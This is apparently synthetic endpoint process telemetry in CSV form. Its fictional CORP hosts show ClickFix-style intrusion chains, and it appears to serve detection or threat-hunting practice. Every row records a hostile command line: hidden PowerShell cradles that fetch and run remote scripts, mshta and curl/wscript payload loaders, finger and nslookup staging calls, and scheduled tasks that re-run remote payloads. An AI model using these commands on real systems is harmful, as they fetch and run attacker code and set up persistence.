Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-03-01T17:01:47.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NonInteractive -NoP -Ep Bypass -c ""iex(iwr('https://91.242.33.14/stage2.ps1').Content)""",4140,explorer.exe,4074,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,jsmith,CORP,S-1-5-21-3456789012-1234567890-987654321-1001,1a3d1fa7bc8960a923b8c1e9392456de
2026-03-02T21:36:30.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,powershell.exe -WindowStyle Hidden -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAvAHAAYQB5AGwAbwBhAGQAKQA=,4331,explorer.exe,4206,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,mjones,CORP,S-1-5-21-3456789012-1234567890-987654321-1002,1825bc5430beb45f683514f2ceb81f9d
2026-03-03T18:01:42.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NoP -c ""IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.live/update.ps1')""",4490,explorer.exe,4384,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,11c58ef0dd463c09475287aa5408f9ac
2026-03-04T20:20:21.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -ep bypass -w hidden -nop -c ""irm https://185.220.101.45/ldr | iex""",4789,explorer.exe,4688,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,d4f8fd72f3821cfdc083b73a473bd358
2026-03-05T18:10:15.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c,mshta.exe https://clearfake-cdn.shop/update.hta,4982,explorer.exe,4837,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,68949b8d00af5b3a2812859a1337739e
2026-03-06T22:02:39.000Z,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,CORP-LT-002,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c,"mshta.exe ""javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -w hidden -c iex(iwr https://94.131.111.99/bot)',0)""",5067,explorer.exe,5003,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,4991ab9bebc2026faf34cf65a193c4b2
2026-03-07T22:13:52.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c,mshta.exe https://185.234.247.12/verify.hta,5218,explorer.exe,5130,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,e68933a9c9e48e8c25c61c45c63d04ee
2026-03-08T22:18:07.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d,finger.exe user@91.92.240.13,5334,explorer.exe,5325,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,cd2372c22bffe17b532401fcf758dce2
2026-03-09T21:43:38.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e,ct.exe 193.142.146.35,5516,explorer.exe,5351,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,54669d1910df997455ab946da5b5cdc2
2026-03-10T23:54:07.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d,finger.exe root@185.220.101.42,5617,explorer.exe,5592,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,7306958845d5a68d290a3abbc35b9fea
2026-03-11T20:45:49.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,cmd.exe /c nslookup payload.corp-update.icu 91.242.33.14,5751,explorer.exe,5738,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,33107475ca8622250b36e356339b77a8
2026-03-11T20:45:51.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f,nslookup payload.corp-update.icu 91.242.33.14,5830,cmd.exe,5751,cmd.exe /c nslookup payload.corp-update.icu 91.242.33.14,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,1f652a87333ee3447dbf4bc1ffa623d0
2026-03-13T00:26:39.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,cmd.exe /c nslookup stage2.cdn-secure.live 193.142.146.35,6008,explorer.exe,5997,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,4a27ebf28baaf744a08dd21be3954cb1
2026-03-13T00:26:41.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f,nslookup stage2.cdn-secure.live 193.142.146.35,6139,cmd.exe,6008,cmd.exe /c nslookup stage2.cdn-secure.live 193.142.146.35,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,9b33e3a42620f9a974fd33d184f2fd0f
2026-03-13T23:52:22.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,cmd.exe /c nslookup bot.install-verify.shop 185.220.101.45,6258,explorer.exe,6180,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,143b45e3b6d1f6bbf48f709c49a22441
2026-03-13T23:52:24.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f,nslookup bot.install-verify.shop 185.220.101.45,6272,cmd.exe,6258,cmd.exe /c nslookup bot.install-verify.shop 185.220.101.45,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,6231ee7342c2d2eb01bf9e733f800385
2026-03-15T00:24:05.000Z,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,CORP-LT-002,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""WindowsUpdate"" /tr ""wscript.exe C:\Users\Public\update.vbs"" /sc minute /mo 19 /f",6623,powershell.exe,6450,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://91.92.240.13/init)""",explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,jsmith,CORP,S-1-5-21-3456789012-1234567890-987654321-1001,a74e02a9220b9ea98a0f9508dfe2c0a0
2026-03-15T23:05:34.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""EdgeUpdate"" /tr ""powershell.exe -w hidden -c iex(iwr https://91.92.240.13/s3)"" /sc minute /mo 19 /f",6864,powershell.exe,6812,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://91.92.240.13/init)""",explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,mjones,CORP,S-1-5-21-3456789012-1234567890-987654321-1002,ac75c344608e149e44b9e6020d31812e
2026-03-16T21:00:34.000Z,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-005,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""SysMaint"" /tr ""mshta.exe https://185.220.101.45/persist.hta"" /sc minute /mo 19 /f",7118,powershell.exe,7009,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://91.92.240.13/init)""",explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,b8e19f568787ea2104482a220308aa5e
2026-03-21T01:25:29.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,curl.exe -s https://fake-interview.com/verify -o C:\Users\Public\verify.vbs,7746,cmd.exe,7592,cmd.exe /c curl.exe -s https://fake-interview.com/verify -o C:\Users\Public\verify.vbs,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,ff69723d584fc85b2697384d801e8690
2026-03-21T01:26:09.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c,"wscript.exe ""C:\Users\Public\verify.vbs""",7926,curl.exe,7746,curl.exe -s https://fake-interview.com/verify -o C:\Users\Public\verify.vbs,cmd.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,1e0d02b5fe7402cddd83ad037066e289
2026-03-22T00:24:55.000Z,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-005,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,curl.exe --silent https://194.165.16.11/svc.vbs -o C:\ProgramData\svc.vbs,8186,cmd.exe,8075,cmd.exe /c curl.exe --silent https://194.165.16.11/svc.vbs -o C:\ProgramData\svc.vbs,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,c34201db2c3aacdcaed54a468bde005b
2026-03-22T00:25:35.000Z,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-005,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c,"wscript.exe ""C:\ProgramData\svc.vbs""",8283,curl.exe,8186,curl.exe --silent https://194.165.16.11/svc.vbs -o C:\ProgramData\svc.vbs,cmd.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,4eb9047dba2ac3d9bcf2fc3bd95874c2
2026-03-23T00:38:14.000Z,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-006,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,curl.exe -k https://91.92.240.13/meet.vbs -o C:\Users\Public\meet.vbs,8430,cmd.exe,8292,cmd.exe /c curl.exe -k https://91.92.240.13/meet.vbs -o C:\Users\Public\meet.vbs,explorer.exe,8a4ef8dbf1d9a5b2c3e4f567890a1b2c3d4e5f6a,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,9d37efb6eafb3e9054ec84ce002ccb25
2026-03-23T00:38:54.000Z,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-006,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c,"wscript.exe ""C:\Users\Public\meet.vbs""",8556,curl.exe,8430,curl.exe -k https://91.92.240.13/meet.vbs -o C:\Users\Public\meet.vbs,cmd.exe,7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,7d3572cc788fd0cd65c06b93c8edabdd
2026-03-23T21:51:19.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://kimsuky-c2.live/stage2.ps1)""",8927,explorer.exe,8742,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,6060b1ebe53e5f4c6c7e9a2c467f358b
2026-03-23T21:53:19.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""KimsukyUpdate"" /tr ""wscript.exe C:\Users\Public\upd.vbs"" /sc minute /mo 19 /f",9095,powershell.exe,8927,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://kimsuky-c2.live/stage2.ps1)""",explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,d2e76deb10b6a6622ac1d5ca4e5d8f12
